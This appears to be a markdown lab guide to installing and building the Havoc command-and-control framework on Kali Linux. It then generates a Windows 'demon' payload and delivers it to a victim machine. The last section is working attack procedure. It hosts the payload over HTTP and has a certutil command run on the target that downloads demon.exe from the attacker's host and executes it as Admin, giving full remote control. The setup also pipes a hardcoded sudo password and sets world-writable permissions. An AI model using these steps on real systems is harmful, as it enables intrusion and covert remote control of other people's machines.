# Havoc C2 — Installation

## What is Havoc

Havoc is a Command & Control (C2) framework. In simple terms:

- You run it on your Kali machine
- It lets you generate a payload (called a **demon**) — a Windows executable
- Once that executable runs on a victim machine, it calls back to your Kali
- You then have full remote control over that machine through the Havoc GUI

**Three parts — all controlled from Kali:**

| Part | Where it runs | What it does |
|---|---|---|
| Team server | Kali | Backend C2 server, receives connections from victims |
| Client (GUI) | Kali | Your operator dashboard — create listeners, generate payloads, issue commands |
| Demon (agent) | Windows victim | The payload that runs on the target and calls back to your team server |

The Windows machine never runs Havoc itself. It only runs the demon payload you generate.

---

## Dependencies

```bash
echo "kali" | sudo -S apt install -y \
  golang mingw-w64 python3-dev python3-pip \
  libfontconfig1 cmake \
  qtbase5-dev qtchooser qt5-qmake qtbase5-dev-tools \
  libqt5websockets5-dev nlohmann-json3-dev \
  libspdlog-dev libfmt-dev
```

---

## Clone

```bash
echo "kali" | sudo -S git clone https://github.com/HavocFramework/Havoc.git /opt/havoc
echo "kali" | sudo -S chmod -R 777 /opt/havoc
```

---

## Fix Dependencies (required for current Kali)

Havoc expects older versions of toml11 and spdlog. Drop them in manually:

```bash
# toml11 v3
git clone --depth=1 -b v3.8.1 https://github.com/ToruNiina/toml11.git /tmp/toml11
cp /tmp/toml11/toml.hpp /opt/havoc/client/include/toml.hpp
cp -r /tmp/toml11/toml /opt/havoc/client/include/toml

# spdlog v1.11 (bundled, avoids system fmt conflicts)
git clone --depth=1 -b v1.11.0 https://github.com/gabime/spdlog.git /tmp/spdlog
cp -r /tmp/spdlog/include /opt/havoc/client/external/spdlog/include
```

Add `fmt` to link libraries in CMakeLists (line ~197):
```bash
sed -i 's|    ${PYTHON_LIBRARIES}|    ${PYTHON_LIBRARIES}\n    fmt|' /opt/havoc/client/CMakeLists.txt
```

---

## Build Team Server

```bash
cd /opt/havoc/teamserver
go mod download
go build -buildvcs=false -o havoc .
```

Binary: `/opt/havoc/teamserver/havoc`

---

## Build Client

```bash
cd /opt/havoc/client
mkdir -p build && cd build
cmake .. -Wno-dev
make -j$(nproc)
```

Binary: `/opt/havoc/client/Havoc`

---

## Run

```bash
# Terminal 1 — start team server (runs on Kali, listens for demon callbacks)
cd /opt/havoc
sudo ./teamserver/havoc server --profile ./profiles/havoc.yaotl -v

# Terminal 2 — open client GUI (also on Kali, connects to team server)
/opt/havoc/client/Havoc
```

Default team server credentials are in the profile:
```bash
cat /opt/havoc/profiles/havoc.yaotl
```

---

## Generate and Deploy a Demon

1. In Havoc client: **View → Listeners → Add**
   - Protocol: HTTP
   - Host: `<KALI_IP>`
   - Port: 80

2. **Attack → Payload → Generate**
   - Format: Windows EXE
   - Listener: select the one you just created
   - Save as `demon.exe`

3. Host and deliver to Windows victim:
```bash
# On Kali — host the file
cp demon.exe /tmp/
python3 -m http.server 8080 --directory /tmp/

# On Windows VM — run in cmd as Admin
certutil -urlcache -split -f http://<KALI_IP>:8080/demon.exe C:\Windows\Temp\demon.exe
C:\Windows\Temp\demon.exe
```

4. Demon calls back → session appears in Havoc client → right-click → Interact
